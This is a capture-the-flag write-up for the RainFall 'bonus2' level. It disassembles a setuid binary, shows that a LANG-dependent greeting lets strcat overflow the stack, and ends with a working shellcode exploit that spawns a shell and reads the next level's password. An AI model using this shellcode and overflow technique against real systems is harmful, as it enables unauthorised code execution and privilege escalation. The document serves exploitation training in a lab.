# Bonus 2



```sh
(gdb) info func
All defined functions:

Non-debugging symbols:
0x08048318  _init
0x08048360  memcmp
0x08048360  memcmp@plt
0x08048370  strcat
0x08048370  strcat@plt
0x08048380  getenv
0x08048380  getenv@plt
0x08048390  puts
0x08048390  puts@plt
0x080483a0  __gmon_start__
0x080483a0  __gmon_start__@plt
0x080483b0  __libc_start_main
0x080483b0  __libc_start_main@plt
0x080483c0  strncpy
0x080483c0  strncpy@plt
0x080483d0  _start
0x08048400  __do_global_dtors_aux
0x08048460  frame_dummy
0x08048484  greetuser
0x08048529  main
0x08048640  __libc_csu_init
0x080486b0  __libc_csu_fini
0x080486b2  __i686.get_pc_thunk.bx
0x080486c0  __do_global_ctors_aux
0x080486ec  _fini
(gdb) 
```

```sh
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:	push   ebp
   0x0804852a <+1>:	mov    ebp,esp
   0x0804852c <+3>:	push   edi
   0x0804852d <+4>:	push   esi
   0x0804852e <+5>:	push   ebx
   0x0804852f <+6>:	and    esp,0xfffffff0
   0x08048532 <+9>:	sub    esp,0xa0
   0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
   0x0804853c <+19>:	je     0x8048548 <main+31>
   0x0804853e <+21>:	mov    eax,0x1
   0x08048543 <+26>:	jmp    0x8048630 <main+263>
   0x08048548 <+31>:	lea    ebx,[esp+0x50]
   0x0804854c <+35>:	mov    eax,0x0
   0x08048551 <+40>:	mov    edx,0x13
   0x08048556 <+45>:	mov    edi,ebx
   0x08048558 <+47>:	mov    ecx,edx
   0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
   0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804855f <+54>:	add    eax,0x4
   0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
   0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
   0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
   0x08048570 <+71>:	lea    eax,[esp+0x50]
   0x08048574 <+75>:	mov    DWORD PTR [esp],eax
   0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
   0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
   0x0804857f <+86>:	add    eax,0x8
   0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
   0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
   0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
   0x08048590 <+103>:	lea    eax,[esp+0x50]
   0x08048594 <+107>:	add    eax,0x28
   0x08048597 <+110>:	mov    DWORD PTR [esp],eax
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
   0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
   0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax
   0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
   0x080485ba <+145>:	je     0x8048618 <main+239>
   0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
   0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
   0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
   0x080485db <+178>:	test   eax,eax
   0x080485dd <+180>:	jne    0x80485eb <main+194>
   0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>
   0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
   0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
   0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
   0x08048602 <+217>:	mov    DWORD PTR [esp],eax
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
   0x0804860a <+225>:	test   eax,eax
   0x0804860c <+227>:	jne    0x8048618 <main+239>
   0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2
---Type <return> to continue, or q <return> to quit---
   0x08048618 <+239>:	mov    edx,esp
   0x0804861a <+241>:	lea    ebx,[esp+0x50]
   0x0804861e <+245>:	mov    eax,0x13
   0x08048623 <+250>:	mov    edi,edx
   0x08048625 <+252>:	mov    esi,ebx
   0x08048627 <+254>:	mov    ecx,eax
   0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
   0x0804862b <+258>:	call   0x8048484 <greetuser>
   0x08048630 <+263>:	lea    esp,[ebp-0xc]
   0x08048633 <+266>:	pop    ebx
   0x08048634 <+267>:	pop    esi
   0x08048635 <+268>:	pop    edi
   0x08048636 <+269>:	pop    ebp
   0x08048637 <+270>:	ret    
End of assembler dump.
(gdb)
```


```sh
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   ebp
   0x08048485 <+1>:	mov    ebp,esp
   0x08048487 <+3>:	sub    esp,0x58
   0x0804848a <+6>:	mov    eax,ds:0x8049988
   0x0804848f <+11>:	cmp    eax,0x1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>
   0x08048494 <+16>:	cmp    eax,0x2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
   0x08048499 <+21>:	test   eax,eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134>
   0x0804849d <+25>:	mov    edx,0x8048710
   0x080484a2 <+30>:	lea    eax,[ebp-0x48]
   0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
   0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
   0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
   0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
   0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
   0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
   0x080484ba <+54>:	mov    edx,0x8048717
   0x080484bf <+59>:	lea    eax,[ebp-0x48]
   0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
   0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
   0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
   0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
   0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
   0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
   0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
   0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
   0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
   0x080484e9 <+101>:	mov    edx,0x804872a
   0x080484ee <+106>:	lea    eax,[ebp-0x48]
   0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
   0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
   0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
   0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
   0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
   0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
   0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
   0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
   0x08048509 <+133>:	nop
   0x0804850a <+134>:	lea    eax,[ebp+0x8]
   0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
   0x08048511 <+141>:	lea    eax,[ebp-0x48]
   0x08048514 <+144>:	mov    DWORD PTR [esp],eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt>
   0x0804851c <+152>:	lea    eax,[ebp-0x48]
   0x0804851f <+155>:	mov    DWORD PTR [esp],eax
   0x08048522 <+158>:	call   0x8048390 <puts@plt>
   0x08048527 <+163>:	leave  
   0x08048528 <+164>:	ret    
End of assembler dump.
(gdb)
```


```sh
void greetuser(undefined param_1)
{
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined2 local_3c;
  undefined local_3a;
  
  if (language == 1) {
    local_4c = 0xc3767948;
    local_48 = 0x20a4c3a4;
    local_44 = 0x69a4c370;
    local_40 = 0xc3a4c376;
    local_3c = 0x20a4;
    local_3a = 0;
  }
  else if (language == 2) {
    local_4c = 0x64656f47;
    local_48 = 0x64696d65;
    local_44 = 0x21676164;
    local_40 = CONCAT22(local_40._2_2_,0x20);
  }
  else if (language == 0) {
    local_4c = 0x6c6c6548;
    local_48 = CONCAT13(local_48._3_1_,0x206f);
  }
  strcat((char *)&local_4c,&param_1);
  puts((char *)&local_4c);
  return;
}

undefined4 main(int param_1,int param_2)
{
  undefined4 uVar1;
  char *__s1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  byte bVar5;
  char *pcVar6;
  undefined4 local_60 [10];
  char acStack_38 [36];
  char *local_14;
  
  bVar5 = 0;
  if (param_1 == 3) {
    puVar3 = local_60;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + 1;
    }
    strncpy((char *)local_60,*(char **)(param_2 + 4),0x28);
    strncpy(acStack_38,*(char **)(param_2 + 8),0x20);
    pcVar6 = "LANG";
    __s1 = getenv("LANG");
    local_14 = __s1;
    if (__s1 != (char *)0x0) {
      iVar2 = memcmp(__s1,&DAT_0804873d,2);
      if (iVar2 == 0) {
        language = 1;
        pcVar6 = __s1;
      }
      else {
        pcVar6 = local_14;
        iVar2 = memcmp(local_14,&DAT_08048740,2);
        if (iVar2 == 0) {
          language = 2;
        }
      }
    }
    puVar3 = local_60;
    puVar4 = (undefined4 *)&stack0xffffff50;
    for (iVar2 = 0x13; iVar2 != 0; iVar2 = iVar2 + -1) {
      *puVar4 = *puVar3;
      puVar3 = puVar3 + (uint)bVar5 * -2 + 1;
      puVar4 = puVar4 + (uint)bVar5 * -2 + 1;
    }
    uVar1 = greetuser((char)pcVar6);
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

This binary is kind heavy.



```sh
bonus2@RainFall:~$ ./bonus2 lol
bonus2@RainFall:~$ ./bonus2 lol hey
Hello lol
bonus2@RainFall:~$ ./bonus2 lol hey hry
bonus2@RainFall:~$
```

The program seems to wait exacly 2 argument.

```sh
bonus2@RainFall:~$ ./bonus2 wtfffffffff hey
Hello wtfffffffff
bonus2@RainFall:~$ ./bonus2 wtffffffffffffffffffffffffffffffff hey    
Hello wtffffffffffffffffffffffffffffffff
bonus2@RainFall:~$
```

We dont quite know how is the second argument is used.

The program seems to use the LANG environnement variable.

The language variable might a global, since its not initialised, this value receive a value that depend of the value of LANG, that we can modifiy.

Lets check what is it checking.



```sh
End of assembler dump.
(gdb) x/x $esp+0x9c
0xbffff6cc:	0xbfffff3a
(gdb) x/s 0xbfffff3a
0xbfffff3a:	 "fi"
(gdb)
```

Lets try to change our LANG environnement variable to fi.

```sh
bonus2@RainFall:~$ LANG=fi ./bonus2 lolllllll 123456
Hyvää päivää lolllllll
bonus2@RainFall:~$
```


Lets try to make it segfault.

```sh
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 500") hey
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhey
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 50") hey
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhey
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 40") hey
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhey
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 30") hey
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
bonus2@RainFall:~$
```

The result is interessting, its not segfaulting but it ends up printing our second argument, we know av[1] and av[2] are close to each other in the memory, so weoverflowed something, but not enough to make it segfault.


Lets try to overflow the second argument.

```sh
bonus2@RainFall:~$ ./bonus2 $(python -c "print 'A' * 500") $(python -c "print 'A' * 50")
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
bonus2@RainFall:~$ 
```

So its segfaulting now, lets decrypt that in gdb.

```sh
(gdb) run $(python -c "print 'A' * 500") $(python -c "print 'A' * 50")
Starting program: /home/user/bonus2/bonus2 $(python -c "print 'A' * 500") $(python -c "print 'A' * 50")
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)
```

We overflowed the EIP, but only 2 address.

The fact that we are limited is normal, the program use strncpy to fill his buffers.

Lets checking using the fi language.


```sh
bonus2@RainFall:~$ LANG=fi gdb ./bonus2 -q
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) run $(python -c "print 'A' * 500") $(python -c "print 'A' * 50")
Starting program: /home/user/bonus2/bonus2 $(python -c "print 'A' * 500") $(python -c "print 'A' * 50")
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb)
```

We now have the control of the EIP.

We can now guess that since the language make the "hello" more heavy, that's the reason the overflow now works, because we can go further on the stack.

This hello message is getting concatenated by our buffer that have a maximum size because of the strncpy, and that cause the overflow.

Since we control the EIP we can insert a shellcode.


We are going to insert our shellcode into av[1], and then give the address of av[1] to the EIP.

For that im going to give a random return address, followe by a random place where my NOP's is stored in av[1].

We already did it a several times in this CTF so no need to show how we find those addresses.

```sh
./bonus2 `python -c "print('\x90' * 45 + 
'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ' ' + '\x90' * 18 + '\x28\x85\x04\x08' + '\xd4\xf8\xff\xbf' )"`
```


```sh
bonus2@RainFall:~$ ./bonus2 `python -c "print('\x90' * 45 + '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + ' ' + '\x90' * 18 + '\x28\x85\x04\x08' + '\xd4\xf8\xff\xbf' )"`
Hyvää päivää ����������������������������������������������������������(����
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$ 
```

And it worked !